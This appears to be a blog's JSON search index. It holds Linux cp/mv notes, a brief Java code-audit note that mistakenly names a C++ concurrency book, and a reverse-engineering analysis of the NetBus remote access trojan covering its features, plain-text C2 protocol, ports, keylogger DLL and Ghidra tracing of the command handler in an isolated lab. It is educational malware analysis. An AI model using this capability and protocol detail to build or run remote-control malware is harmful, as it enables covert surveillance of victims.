-a option) is required when copying directories.\n\n\n-u, --update\nWhen copying files from one directory to another, only copy files that either don’t exist or are newer than the existing corresponding files in the destination directory. Useful for skipping unnecessary copies.\n\n\n-v, --verbose\nDisplay informative messages as the copy is performed.\n\n\n\n\n\n\n\n\nCommand\nResults\n\n\n\n\ncp file1 file2\nCopy file1 to file2. If file2 exists, it is overwritten with the contents of file1. If file2 does not exist, it is created.\n\n\ncp -i file1 file2\nSame as the previous command, except that if file2 exists, the user is prompted before it is overwritten.\n\n\ncp file1 file2 dir1\nCopy file1 and file2 into directory dir1. The directory dir1 must already exist.\n\n\ncp dir1/* dir2\nUsing a wildcard, copy all the files in dir1 into dir2. The directory dir2 must already exist.\n\n\ncp -r dir1 dir2\nCopy the contents of directory dir1 to directory dir2. If dir2 does not exist, it is created and will contain the same contents as dir1. If dir2 does exist, then dir1 (and its contents) will be copied into dir2.\n\n\n\n\nmvUseful Options and Examples:\n\n\n\n\nOption\nMeaning\n\n\n\n\n-i, --interactive\nBefore overwriting an existing file, prompt the user for confirmation. If this option is not specified, mv will silently overwrite files.\n\n\n-u, --update\nWhen moving files from one directory to another, only move files that either don’t exist or are newer than the existing corresponding files in the destination directory.\n\n\n-v, --verbose\nDisplay informative messages as the move is performed.\n\n\n\n\n\n\n\n\nCommand\nResults\n\n\n\n\nmv file1 file2\nMove file1 to file2. If file2 exists, it is overwritten with the contents of file1. If file2 does not exist, it is created. In either case, file1 ceases to exist.\n\n\nmv -i file1 file2\nSame as the previous command, except that if file2 exists, the user is prompted before it is overwritten.\n\n\nmv file1 file2 dir1\nMove file1 and file2 into directory dir1. The directory dir1 must already exist.\n\n\nmv dir1 dir2\nIf directory dir2 does not exist, create directory dir2 and move the contents of directory dir1 into dir2, then delete directory dir1. If directory dir2 does exist, move directory dir1 (and its contents) into directory dir2.\n\n\n\n\nChapter 6 - RedirectionStandard Input, Output and ErrorPipelineChapter 9 - PermissionsChapter 15 - Storage MediaChapter 16 - NetworkingChapter 18 - Archiving and BackupChapter 19 - Regular ExpressionChapter 23 - Compiling ProgramsChapter 24 - Writing Your First ScriptChapter 25 - Starting a Project","tags":["Linux","Command Line","Linux Command","Book","Learning","Study","Note"]},{"title":"[Book] Java Code Audit (Fundamental)","url":"/2026/02/17/2026-2-17-JavaCodeAudit/","content":"El Libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “C++ Concurrency In Action (Second Edition)”.The content will be continuously updated as I read through the book.\nReflectionChapter 4 - Java EEThere are three main versions of Java platform:\n\nJava SE (Java Platform Standard Edition)\nJava EE (Java Platform Enterprise Edition)\nJava ME (Java Platform Micro Edition)\n\n4.1 - Hierarchy of Java EETerminology\nJDBC: Java Database Connectivity\nJNDI: Java Naming and Directory\nEJB: JavaBean\nRMI: Remote Method Invocation\nServlet: Server Applet\nJSP: JavaServer Pages\nXML: eXtensible Markup Language\nJMS: Java Message Service\n\nJava MVCIt was introduced in 1978.\n\nModel: It represents an object or Java POJO with data.\nController: It controls logics of Model or View. It inputs data from user to Model.\nView: Visualization of data in Model\n\n","categories":["Book"],"tags":["Book","Note"]},{"title":"[Studying] Inside Different Generations of RATs","url":"/2026/02/18/2026-2-18-StudyingRAT/","content":"BackgroundRecently, I have been developing different types of remote access tools (RATs).My interest in RAT development originates from personal curiosity and long-term fascination with how remote control malware works internally.\nYears ago, when I was a begineer in cybersecurity——and by “begineer,” I truly mean knowing almost nothing beyond simple denial-of-service attempts using the ping command in cmd.exe——I used to download numerous tools from various websites. At that time, I barely understood operational security or the risks involved. However, experimenting with existing tools was, in my case, the only accessible way to explore cybersecurity as a middle school student.\nOver the years, my perspective has changed. Instead of merely using tools, I become more interested in understanding how they are designed and implemented. Today, I have published several remote access tools for educational and research purposes, such as DuplexSpy and Eden-RAT. Other projects are still under development or being rewritten. \nSome may ask: why develop multiple RATs? What are the differences? Looking back at 2016, when The Shadow Brokers leaked numerous tools allegedly associated with the National Security Agency 1, one important lesson become clear: advanced threat groups often develop multiple implants and remote access tools tailored for different operational stages and objectives.\nDuring my own development process, I began recalling the older RATs I had downloaded but never truly understood. Recently, as I have been studying reverse engineering and malware analysis more systemically, I realized this presents and excellent opportunity to revist those historical tools——not to use them, but to analyze and understand their architecture.\nCybersecurity has gradually become more complex. The number of domains, tools, and technologies continues to grow, while learning resources can feel fragmented. The gap between begineers and experienced professional seems wider than ever. This is one of the reasons I started publishing technical articles on my blog. While blogging may feel somewhat old-school, I prefer structed and long-form documentation of knowlege.\nIn this series, I will analyze different generations of remote access tools——from early legacy trojans to more modern modular RATs——focusing on architecture, communication protocols, and design evolution from a reverse engineering perspective.\nArticlesThe table below lists all articles in this series analyzing various remote access tools.It will be updated continuously as new research is published.\n\n\n\n\nRAT\nArticle\n\n\n\n\nNetBus\nAnalyzing NetBus\n\n\nBack Orifice\nComing soon…\n\n\nSubSeven\nComing soon…\n\n\nBeast\nComing soon…\n\n\n\n\nReferences\n1. https://en.wikipedia.org/wiki/The_Shadow_Brokers &#8617;\n\n","categories":["Studying/RAT"],"tags":["Studying","Reverse Engineering","RAT","Remote Access Tool","Malware","Malware Analysis"]},{"title":"[Studying] Analyzing NetBus","url":"/2026/02/18/2026-2-18-Netbus/","content":"IntroductionThis article is part of my series: Inside Different Generations of RATs. If you are interested in the full series, please click the mentioned page.\nNetbusNetBus is a remote access tool (RAT) to control Microsoft Windows systems. It was created in 1998 and became controversial due to its potential use as a Trojan horse.\nNetBus was written in Delphi by Carl-Fredrik Neikter. It was in wide circulation before Back Orifice was released.\nIn modern RAT architecture, the system typically consists of two components: a client and a server. In many contemporary C2 frameworks——such as Cobalt Strike, Armitage or United Rake——the architecture may involve multiple clients connecting to a C2 server. However, in the late 1990s, the “client” refers to the attacker-side controller application, while the “server” refers to the payload installed on the victim machine.\nIn this article, the following versions are analyzed:\n\nNetBus 1.20\nNetBus 1.53\nNetBus 1.60\nNetBus 1.70\nNetBus 2.0 Pro\nNetBus 2.1 Pro\n\nExperimental Environment SetupTo safely conduct malware analysis, the environment should be isolated using virtual machines. Under no circumstances should malware be executed on a personal or production system.\n\n\n\n\nTool\nDescription\n\n\n\n\nPETool\nUtility for inspecting and modifying Portable Executable (PE) files, including EXE and DLL modules\n\n\nProcess Explorer\nAdvanced process monitoring tool for examining running processes, loaded DLLs, and system handles\n\n\nPEView\nStatic analysis tool for examining PE and COFF file structures (EXE, DLL, OBJ, LIB)\n\n\nCFF Explorer\nPE file editor and analyzer developed by NTCore, supporting 32-bit/64-bit executables and .NET assemblies\n\n\nWireshark\nNetwork protocol analyzer used to capture and inspect live or recorded traffic\n\n\nGhidra\nOpen-source software reverse engineering framework developed by the NSA\n\n\n\n\n\n\n\n\nDevice\nIP Address\nDescription\n\n\n\n\nWindows XP x86 (VM)\n10.98.217.130\nVictim machine used for executing the NetBus server component\n\n\nWindows 10 x64 (VM)\n10.98.222.136\nAnalyst machine used for reverse engineering and client-side interaction\n\n\n\n\nThe two virtual machines were configured within an isolated internal network to prevent unintended external communication.\nNetBus 1.20File tree:└───Netbus1.20        KeyHook.dll //A DLL file, use with SysEdit.exe        NetBus.exe  //Client, controller        NetBus.rtf  //The README documentation        SysEdit.exe //Server, payload\nFeatures in this version:\n\nOpen/close the CD-ROM once.\nOpen/close the CD-ROM in intervals, the time interval is set in seconds.\nShow optional image. The image must exist in the same directory as SysEdit. The supported image-formats is BMP and JPG.\nSwap mouse buttons – the right mouse button gets the left mouse button’s functions and vice versa.\nStart optional application.\nPlay optional sound-file. The sound-file must exist in the same directory as SysEdit. The supported sound-format is WAV.\nPoint the mouse to optional coordinates. You can even navigate the mouse on the target computer with your own! \nShow a message or question on the screen. Sentence that ends with ”?” gives a question, and a sentence that starts with ”?” gives a dialog-box that the user can give his ”answer” in. The answer is always sent back to you!\nExit Windows.\nGo to an optional URL within a web-browser.\nSend keystrokes to the active application on the target computer! The text in the field ”Message/text” will be inserted in the application that has focus. (”|” represents enter).\nListen for keystrokes and send them back to you!\nGet a screendump! (should not be used over slow connections)\nInform yourself about which user-name the person has logged in with.\nIncrease and decrease the sound-volume.\n\nLet’s attempt to execute NetBus.exe on a Windows 10 system:\n\n\n\nA VCL Forms application compiled with Delphi is a native Win32 executable built on top of the Win32 API. This explains why a GUI application developed decades ago can still execute on modern Windows 10 systems. This behavior is expected. However, some features may no longer function correctly due to changes in Windows system architecture and security configuration over time. The officially supported operating systems at the time included:\n\nWindows 95\nWindows 98\nWindows ME\nWindows NT 4.0\n\nNow let’s take a look at the user interface. In version 1.20, only basic features are available. Some functions no longer operate correctly on modern systems. Overal, this version contains simple features. It does not involve modern features, such as file manager (but version 1.70 does).\nNext, execute SysEdit.exe on Windows XP machine, When executed on a Windows XP system, SysEdit.exe binds to TCP ports 12345 and 12346 to listen for incoming connections. These port numbers appear to be hardcoded and cannot be modified through the interface in this version.&gt; netstat ano | find &quot;12345&quot;\nNo firewall warning dialog is triggered on a Windows XP x64 system.\n\n\n\nAnalyze the ProtocolWireshark filter:ip.src == 10.98.217.130 || ip.dst == 10.98.217.130\nAfter connecting to the server (SysEdit.exe):\n\n\n\n\n\n\n\n\n\nAfter TCP handshake, the server notifies the client using a plain text Netbus\\r. The structure of the C2 commands is shown below:\n\n\n\nPort 12345 is used for receiving C2 commands, while port 12346 is dedicated to the “Screen Dump” functionality.\n\n\n\nThe result of ScreenDump——an image——is saved as temp2.jpg\n\n\n\nNetBus 1.53Version 1.53 introduces additional features:\n\n\n\nNew features (Reference: README.txt of this version):\n\nUpload any file from you to the target computer! With this feature it will be possible to remotely update SysEdit with a new version.\nRecord sounds that the microphone catch. The sound is sent back to you!\nMake click sounds every time a key is pressed!\nDownload any file from the target. Before you start to download you can select files in a nice view that represents the harddisks on the target!\n\nNetBus 1.70This version contains more features, such as file manager:\n\n\n\nNetBus 2.0Starting from version 2.0, NetBus evolved into a more comprehensive system management application. Both the client and server components require installation and provide GUI-based interfaces.\nThis version introduces features that are commonly seen in modern RATs, such as:\n\nPort forwarding\nScreen capture\nCamera capture\nRegistry management\nPlugin management\n\n\n\n\n\n\n\n\n\n\nNetBus 2.0 uses a different protocol:\n\n\n\nCompared to the 1.x versions, NetBus 2.0 (and 2.1) implements encoded communication within its protocol.\n\n\n\nReverse EngineeringNetbus 1.20Open SysEdit.exe (version: 1.20) using CFF Explorer. The executable is identified as a 32-bit x64 PE file. Both SysEdit.exe and KeyHook.dll were developed using Delphi.\n\n\n\nI have previously learned how to use Ghidra and IDA; however, I have not extensively performed malware analysis before. This makes the analysis of this legacy RAT a valuable practical exercise!\n\n\n\nEntry Point:\n\n\n\nNo any patch is found:\n\n\n\nImports:\n\n\n\nThis application imports libraries like GDI32.dll, USER32.DLL, which demonstrate that it is a WinGUI application——Delphi VCL.\nTo locate the WinMain entry point in a Delphi application using Ghidra is relatively straightforward once the Windows GUI execution model is understood. Unlike console applications, Win32 GUI applications enter a message loop and process window message via Win32 APIs such as GetMessage (or PeekMessage) and DispatchMessage.\nBy examining references to DispatchMessageA in the import table and tracing its cross-references, we can identify the function responsible for initializing the application.\n\n\n\nRight-click -&gt; Show Reference To:\n\n\n\nRight-click -&gt; Show References to DispatchMessageA:\n\n\n\nNow, we can see a function like this:\n\n\n\nWe can also use Show Call Tree to find this function. Now let’s click into FUN_0042c930:\n\n\n\nThe function signature matches the standard Windows definition:int PASCAL WinMain(    HINSTANCE hInstance,     HINSTANCE hPrevInstance,     LPSTR lpszCmdLine,     int nCmdShow) \nThis is how we find the WinMain() function.\n\nTo identify the C2 command handler, we can trace calls to the recv function, which is responsible for receving data from the attacker.\n\n\n\nAfter stepping through each function within this call chain, the message handler is not immediately visible. In this case, go to the parent function which call FUN_00439b10 using Function Call Tree:\n\n\n\n\n\n\nFrom the decompiled code, it can be inferred that local_c stores the pointer to the received buffer. This is the reason why we cannot see any return value relate to the buffer. Let’s go into FUN_00403ac4:\n\n\n\nWe can see that the buffer is now in puVar2. Let’s step into FUN_004026a8:\n\n\n\nBy continuing to trace the execution flow, we eventually located the function responsible for handling incoming commands.\n\n\n\n\n\n\nAn alternative approach is to search for know C2 command strings within the Defined Data section. Since NetBus 1.x uses plain-text commands, locating the handler becomes significantly easier.\n\n\n\nIn contrast, modern RATs typically employ encrypted C2 channels, which significantly increases the complexity of reverse engineering.\nWe can also use Immunity Debugger(or OllyDbg) to find the message handler:\n\n\n\n\n\n\nThe KeyHook.dll module implements keylogging functionality.\n\n\n\nThe KeyboardProc callback captures keystrokes, processes them, and transmits the recorded data (key char) back to the attacker.\nNetBus 2.0Tracing the TCP handler in NetBus 2.0 reveals a more structured design compared to version 1.x.\n\n\n\nBy continuing to trace the execution flow, the message handler (FUN_0046e2c8) can be identified. Here, param_2 contains the pointer to the received buffer.\n\n\n\nCompare to version 1.x, NetBus 2.0 and 2.1 introduce significant improvements to the communication protocol. A structed protocol is defined to parse imcoming data.\n\n\n\n\n\n\nInstead of identifying C2 commands using plain-text string, version 2.0 uses integer identifiers to represent command types.\n\n\n\n\n\n\nThe authentication function(uVar1 == 5):\n\n\n\nOther C2 commands follow the same protocol structure.\nConclusionOne of the characteristics that contributed to the controversial nature of NetBus was its silent execution. Starting from version 2.0, the server component required installation through a GUI-based installer, shifting its presentation closer to that of a remote administration tool.\nFrom a technical perspective, NetBus 2.0 (and 2.1) represented a significant architectural evolution for its time. It introduced structed protocol handling, plugin-like extensibility, and graphical management features that resemble capabilities found in later-generation RATs.\nThis article marks the beginning of this series and also my first attempt at conducting malware analysis using Ghidra. As this is an early work, some parts of the analysis may not be as refined as they could be.  \nAny feedback or suggestions are highly appreciated!\nTHANKS FOR READING\n"}]